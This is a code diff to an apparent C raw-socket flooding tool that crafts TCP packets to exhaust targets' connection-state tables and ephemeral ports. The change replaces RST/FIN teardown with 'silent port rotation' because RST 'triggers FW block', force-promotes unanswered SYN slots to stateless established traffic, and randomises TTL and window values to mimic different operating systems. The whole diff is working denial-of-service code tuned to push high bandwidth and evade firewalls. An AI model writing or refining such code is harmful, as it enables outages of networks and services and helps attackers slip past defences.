@@ -1983,11 +1983,18 @@ void *worker_thread(void *arg) {
                     unsigned int activate_round = (unsigned int)((unsigned long long)b * SOFT_START_ROUNDS / V17B);
                     if(round < activate_round) continue;
 
-                    // Exponential SYN backoff: 10→20→40→80→160 rounds
-                    unsigned int syn_retries = slot_syn_sent[b] > 0 ? (round > slot_syn_sent[b] ? 1 : 0) : 0;
-                    unsigned int retry_interval = 10 << (syn_retries > 4 ? 4 : syn_retries);
-                    if(round - slot_syn_sent[b] < retry_interval && slot_syn_sent[b] != 0) continue;
+                    // SYN retry every 3 rounds (simple, fast)
+                    if(round - slot_syn_sent[b] < 3 && slot_syn_sent[b] != 0) continue;
                     slot_syn_sent[b] = round;
+                    slot_rn[b]++; // Count SYN attempts
+
+                    // HYBRID: After SYN_MAX_RETRY failed SYN attempts, force-promote to stateless
+                    if(slot_rn[b] >= SYN_MAX_RETRY) {
+                        slot_st[b] = ST_FORCE_EST;
+                        slot_seq[b] = fast_rand();
+                        slot_ack[b] = fast_rand();
+                        continue;
+                    }
 
                     struct iphdr *ih2=(struct iphdr*)(syn_buf+V17ETH);
                     ih2->id=htons(fast_rand()&0xFFFF);
@@ -2171,73 +2178,18 @@ void *worker_thread(void *arg) {
 
                 slot_rn[b]++;
 
-                // Connection recycling — fast for variety but long enough to push Gbps
-                // Dynamic churn rate to exhaust state table
-                if (stealth) {
-                    churn_threshold = (args.port == 80 || args.port == 443) ? 
-                                                    (1500 + (fast_rand() % 3000)) : (2000 + (fast_rand() % 4000));
-                } else {
-                    churn_threshold = (args.port == 80 || args.port == 443) ? 
-                                                    (1500 + (fast_rand() % 3000)) : (2000 + (fast_rand() % 4000));
-                }
-                
-                if(slot_rn[b] > churn_threshold) {
-                    // Mix of RST and FIN/ACK for state exhaustion
-                    if (fast_rand() % 2 == 0) {
-                        flags = (5<<12)|0x004; // RST
-                        th->psh=0; th->ack=0; th->rst=1; th->fin=0; th->syn=0; th->urg=0;
-                    } else {
-                        flags = (5<<12)|0x011; // FIN+ACK
-                        th->psh=0; th->ack=1; th->rst=0; th->fin=1; th->syn=0; th->urg=0;
-                    }
-                    current_pl = 0; // RST/FIN has no payload
-                    tw[6] = htons(flags);
-                    
-                    // Update IP/TCP for teardown
-                    unsigned int tot_tcp = V17TCP + current_pl;
-                    unsigned int tot_ip = V17IP + tot_tcp;
-                    ih->tot_len=htons(tot_ip);
-                    if(use_afp){ viov[b].iov_len = V17ETH + tot_ip; }
-                    else { viov[b].iov_len = tot_ip; }
-                    th->seq=htonl(slot_seq[b]);
-                    th->ack_seq=htonl(slot_ack[b]);
-                    th->source=htons(slot_sp[b]);
-                    
-                    // State bypass: Rapid IP ID and fragment variation on teardown
-                    ih->id=htons(fast_rand()&0xFFFF);
-                    ih->frag_off=htons(0x4000);
-                    ih->check=0;
-                    unsigned short *iw2=(unsigned short*)ih;
-                    unsigned int ic=iw2[0]+iw2[3]+htons((unsigned int)(ih->ttl<<8|IPPROTO_TCP))+iw2[6]+iw2[7]+iw2[8]+iw2[9];
-                    ic+=htons(tot_ip)+ih->id;
-                    ic=(ic>>16)+(ic&0xFFFF); ic+=(ic>>16);
-                    ih->check=(unsigned short)~ic;
-                    th->check=0;
-                    unsigned int cs=tcp_base[b]+tw[0]+tw[2]+tw[3]+tw[4]+tw[5]+tw[7];
-                    cs += htons(tot_tcp); cs += tw[6];
-                    cs=(cs>>16)+(cs&0xFFFF); cs+=(cs>>16);
-                    th->check=(unsigned short)~cs;
-                    
-                    vmsg_active[valid_pkts] = vmsg[b];
-                    valid_pkts++;
-                    
-                    // Reset slot to SYN_SENT for new 3WHS — massive ephemeral port exhaustion
-                    slot_st[b] = ST_SYN_SENT;
+                // Connection recycling: silent port rotation (NO RST — RST triggers FW block)
+                if(slot_rn[b] > (3000 + (fast_rand() % 5000))) {
                     slot_rn[b] = 0;
-                    slot_syn_sent[b] = 0;
                     slot_seq[b] = fast_rand();
                     slot_ack[b] = fast_rand();
-                    port_to_slot[slot_sp[b]] = -1;
-                    unsigned short p2;
-                    do { p2 = (unsigned short)(1024 + (fast_rand() % 64000)); } while(port_to_slot[p2] != -1);
-                    slot_sp[b] = p2;
-                    port_to_slot[p2] = b;
+                    slot_sp[b] = (unsigned short)(1024 + (fast_rand() % 64000));
+                    slot_ttl[b] = ttl_t[fast_rand() % ttl_sz];
+                    slot_win[b] = win_t[fast_rand() % win_sz];
                     slot_ch_sent[b] = 0;
-                    
-                    // Emulate completely different OS per new connection
-                    slot_ttl[b] = ttl_t[fast_rand()%ttl_sz];
-                    slot_win[b] = win_t[fast_rand()%win_sz];
-                    continue;
+                    slot_tsval[b] = fast_rand();
+                    slot_tsecr[b] = 0;
+                    th->source = htons(slot_sp[b]);
                 }
 
                 // Skip ClientHello, go straight to raw data
